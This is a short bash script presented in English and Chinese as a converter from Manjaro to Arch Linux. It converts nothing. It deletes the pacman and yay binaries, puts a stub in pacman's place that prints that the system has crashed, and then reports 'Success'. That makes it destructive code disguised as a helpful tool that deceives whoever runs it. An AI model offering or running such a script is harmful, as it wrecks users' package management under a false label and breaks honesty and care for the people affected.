#!/usr/bin/bash
echo Manjaro to Arch Linux Script
echo Manjaro转Arch的脚本！
echo Start to convert
echo 开始转换

rm /usr/bin/pacman
rm /usr/bin/yay
touch /usr/bin/pacman
echo '#!/usr/bin/bash;echo Your System Has Been Crashed!Try to REINSTALL' > /usr/bin/pacman

echo Success!
echo 转换成功！

